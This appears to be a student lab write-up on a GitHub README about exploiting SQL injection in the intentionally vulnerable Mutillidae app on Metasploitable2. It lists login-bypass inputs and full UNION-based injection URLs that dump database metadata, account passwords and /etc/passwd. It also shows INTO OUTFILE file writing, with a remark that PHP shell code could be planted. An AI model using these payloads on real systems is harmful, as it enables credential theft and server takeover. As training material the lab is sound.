# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/pavi365/sqlinjection/assets/115135775/87bd3876-e0d3-44cc-ac62-dd08f9f33953)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/63b1d46a-9d4b-4253-a766-afb34d3d2e50)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/pavi365/sqlinjection/assets/115135775/7cdd2734-3c78-4165-9a64-d0ebeb3ea097)
Click on the menu Login/Register and register for an account
![image](https://github.com/pavi365/sqlinjection/assets/115135775/9128953e-fe51-4d8a-b376-06af1048e010)
Click on the link “Please register here” 
![image](https://github.com/pavi365/sqlinjection/assets/115135775/74908942-cdba-4bec-b2aa-f344631f4b8f)
Click on “Create Account” to display the following page:
![image](https://github.com/pavi365/sqlinjection/assets/115135775/7366f69f-6dd6-4f15-a48c-2d77a2085e69)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/51c61331-75b7-4377-a5c3-80946695603b)
Click “Login”. The logged in page will show as below:
![image](https://github.com/pavi365/sqlinjection/assets/115135775/39710e2d-1124-447a-9d98-e75f09386097)
##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/43200745-f755-409e-aad9-8d6f693fc820)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/61756f8d-e810-4a0c-9be1-227555629fcf)
## Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”
After logging out, Now choose the menu as shown below: 
![image](https://github.com/pavi365/sqlinjection/assets/115135775/d0391d07-d993-4c98-88a7-80aac3156a84)
![image](https://github.com/pavi365/sqlinjection/assets/115135775/4e6edb21-a9e4-4e9a-b3ef-ffe5efdba56a)
![image](https://github.com/pavi365/sqlinjection/assets/115135775/c9fdb2a9-160e-4e91-9da9-7c869af0704a)
![image](https://github.com/pavi365/sqlinjection/assets/115135775/dc87d293-7491-481a-91e3-2b2eaff0f291)
![image](https://github.com/pavi365/sqlinjection/assets/115135775/2cd6337d-3f69-45d0-8b6a-59ae10285bb8)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/0ff5908f-5545-405c-aa36-00a564b888c2)
ince we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:
http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/pavi365/sqlinjection/assets/115135775/082ed379-a42f-4823-b646-a84d7d197db1)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/pavi365/sqlinjection/assets/115135775/bbafaa16-62f0-4c17-938d-d446b46db372)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/e6b9a020-55fb-40fe-b5d3-e39ebc9ae499)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/pavi365/sqlinjection/assets/115135775/6e4cf0cf-b2c5-4442-829e-378ba8f416bf)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/pavi365/sqlinjection/assets/115135775/27dc3bd7-4a39-4e1a-a194-9017e56e58cc)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/bc6281fa-12c7-46be-878b-687e89cb38fd)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/pavi365/sqlinjection/assets/115135775/c5e29cc8-92de-4fec-8a55-7ca706a47e25)
The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/pavi365/sqlinjection/assets/115135775/ef06496d-5350-4253-a707-92ce81391e94)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/pavi365/sqlinjection/assets/115135775/97ab04ee-2cc3-412c-b761-a7d2db3719f3)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/pavi365/sqlinjection/assets/115135775/bb3e4dd1-223b-48dc-bd10-6d23738ec3f0)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/pavi365/sqlinjection/assets/115135775/aceb4b84-1893-4128-b3fc-72e3f4ec9c1f)
## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/pavi365/sqlinjection/assets/115135775/3b0e1f09-17de-4b1a-b739-9926d76613b4)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
